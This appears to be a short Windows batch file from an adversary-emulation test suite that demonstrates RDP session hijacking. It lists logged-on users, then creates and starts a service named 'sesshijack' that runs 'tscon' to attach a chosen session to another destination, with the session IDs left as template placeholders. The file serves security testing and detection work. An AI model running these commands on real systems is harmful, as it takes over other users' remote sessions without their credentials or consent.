@ECHO OFF

ECHO ===========================================================================
ECHO RDP hijacking
ECHO Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session.
ping -n 5 127.0.0.1 > NUL

query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
net start sesshijack
